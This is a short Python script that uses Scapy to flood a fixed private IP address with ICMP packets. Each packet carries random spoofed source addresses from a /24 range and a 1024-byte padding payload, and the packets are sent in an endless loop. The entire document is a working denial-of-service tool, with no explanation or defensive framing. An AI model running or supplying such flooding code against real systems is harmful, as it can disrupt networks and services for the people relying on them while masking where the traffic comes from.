from scapy.all import *

def flood(target_ip, packet_size):
    ip = IP(src=RandIP("192.168.68.1/24"), dst=target_ip)
    icmp = ICMP()
    raw = Raw(b"X"*packet_size)

    packet = ip / icmp / raw
    send(packet, loop=1, inter=0.01, verbose=0)


if __name__ == "__main__":
    flood("192.168.68.64", 1024)